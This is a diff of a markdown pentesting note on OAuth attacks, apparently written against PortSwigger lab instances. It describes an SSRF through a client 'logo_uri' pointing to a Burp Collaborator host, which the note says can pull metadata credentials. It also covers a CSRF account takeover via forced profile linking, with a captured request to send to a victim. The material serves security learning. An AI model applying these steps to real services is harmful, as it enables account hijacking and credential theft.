@@ -40,7 +40,7 @@ Content-Length: 158
 "logo_uri": "http://BURP_URL"
 }
 ```
-Ref: https://portswigger.net/web-security/oauth/openid
+Ref: https://portswigger.net/web-security/oauth/openid<br>
 Now repeat Request1 and dont forget to replace the clientId in the URL of Request1 which we get from hitting /reg endpoint. It will try to logo from "logo_uri" endpoint.
 If you see hit on colloborator then it is SSRF. You can extract the meta data endpoint credentials as welll using this.
 ```
@@ -58,3 +58,27 @@ Content-Length: 158
 }
 ```
 Now hit the Request1 with appropriate client Id.
+## One Click Account takeover CSRF (Forced OAuth Profile Linking)
+This vulnerability arises due to the absence of state parameter. The steps to reproduce are:
+* Login into the application and click on `Add Social Account`.
+* Provide your username and password on OAuth login page and accept the confirmation while intercepting all the request.
+```
+ GET /oauth-linking?code=uqIFPtPr2h3TO8iIkGDhJG5d4RVMTZvL1utfgXmj1UM HTTP/2
+Host: 0aad00a404578a9b800203e400c20056.web-security-academy.net
+Cookie: session=0sUgiiTsNIh9Ueb4tNecrQNdBFRKZxPe
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://oauth-0a8600ba04f48a4680b3015102890056.oauth-server.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers 
+````
+* Drop the above request and send this request to victim.
+* Once victim clicks on the link his account would be linked with your gmail account and you can access his account via OAuth login.
+
